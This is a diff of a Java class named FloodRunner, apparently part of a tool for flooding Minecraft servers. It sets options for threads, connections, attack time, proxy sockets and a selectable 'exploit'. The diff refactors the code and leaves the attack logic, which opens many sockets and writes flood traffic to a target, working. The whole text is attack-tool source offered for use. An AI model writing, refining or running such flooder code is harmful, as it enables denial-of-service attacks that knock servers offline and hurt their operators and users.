@@ -45,20 +45,18 @@ public class FloodRunner {
 
     public void run() {
         String host = (String)this.options.getOption("host", "127.0.0.1");
-        int port = ((Integer)this.options.getOption("port", Integer.valueOf(25565))).intValue();
-        boolean srvResolve = ((Boolean)this.options.getOption("srvResolve", Boolean.valueOf(true))).booleanValue();
-        boolean alwaysResolve = ((Boolean)this.options.getOption("alwaysResolve", Boolean.valueOf(false))).booleanValue();
-        int threads = ((Integer)this.options.getOption("threads", Integer.valueOf(1000))).intValue();
-        int connections = ((Integer)this.options.getOption("connections", Integer.valueOf(1000))).intValue();
-        int attackTime = ((Integer)this.options.getOption("attackTime", Integer.valueOf(30))).intValue();
-        boolean srvResolve2 = ((Boolean)this.options.getOption("srvResolve2", Boolean.valueOf(false))).booleanValue();
-        int timeout = ((Integer)this.options.getOption("timeout", Integer.valueOf(0))).intValue();
-        boolean keepAlive = ((Boolean)this.options.getOption("keepAlive", Boolean.valueOf(true))).booleanValue();
+        int port = ((Integer)this.options.getOption("port", 25565));
+        boolean srvResolve = ((Boolean)this.options.getOption("srvResolve", true));
+        boolean alwaysResolve = ((Boolean)this.options.getOption("alwaysResolve", false));
+        int threads = ((Integer)this.options.getOption("threads", 1000));
+        int connections = ((Integer)this.options.getOption("connections", 1000));
+        int attackTime = ((Integer)this.options.getOption("attackTime", 30));
+        boolean srvResolve2 = ((Boolean)this.options.getOption("srvResolve2", false));
+        boolean keepAlive = ((Boolean)this.options.getOption("keepAlive", true));
         String floodName = String.valueOf(this.options.getOption("exploit", "1"));
-        boolean removeFailure = ((Boolean)this.options.getOption("removeFailure", Boolean.valueOf(false))).booleanValue();
-        Flooders.LOOP_AMOUNT = ((Integer)this.options.getOption("loopAmount", Integer.valueOf(1500))).intValue();
-        boolean print = ((Boolean)this.options.getOption("print", Boolean.valueOf(false))).booleanValue();
-        boolean socksV4 = ((Boolean)this.options.getOption("socksV4", Boolean.valueOf(true))).booleanValue();
+        boolean removeFailure = ((Boolean)this.options.getOption("removeFailure", false));
+        Flooders.LOOP_AMOUNT = ((Integer)this.options.getOption("loopAmount", 1500));
+
         if (srvResolve && alwaysResolve)
             System.out.println(
                     "ServerResolver and AlwaysResolve options are enabled at the same time, are you sure it's fine?");
@@ -111,7 +109,7 @@ public class FloodRunner {
         (new Thread(() -> {
             try {
                 Thread.sleep(1000L * threads);
-            } catch (Exception exception) {}
+            } catch (Exception ignored) {}
             System.out.println("Attack finished.");
             System.exit(-1);
         })).start();
@@ -144,13 +142,13 @@ public class FloodRunner {
                             if (!(socket instanceof SocketHttp)) {
                                 if (alwaysResolve)
                                     try {
-                                        Method m = socket.getClass().getDeclaredMethod("getImpl", new Class[0]);
+                                        Method m = socket.getClass().getDeclaredMethod("getImpl");
                                         m.setAccessible(true);
-                                        Object sd = m.invoke(socket, new Object[0]);
-                                        m = sd.getClass().getDeclaredMethod("setV4", new Class[0]);
+                                        Object sd = m.invoke(socket);
+                                        m = sd.getClass().getDeclaredMethod("setV4");
                                         m.setAccessible(true);
-                                        m.invoke(sd, new Object[0]);
-                                    } catch (Exception exception) {}
+                                        m.invoke(sd);
+                                    } catch (Exception ignored) {}
                                 socket.connect(new InetSocketAddress(newServerName, newServerPort), connections);
                             }
                             DataOutputStream out = new DataOutputStream(socket.getOutputStream());
@@ -170,7 +168,7 @@ public class FloodRunner {
                             }
                         }
                     }
-                } catch (Exception exception) {}
+                } catch (Exception ignored) {}
             });
         }
     }
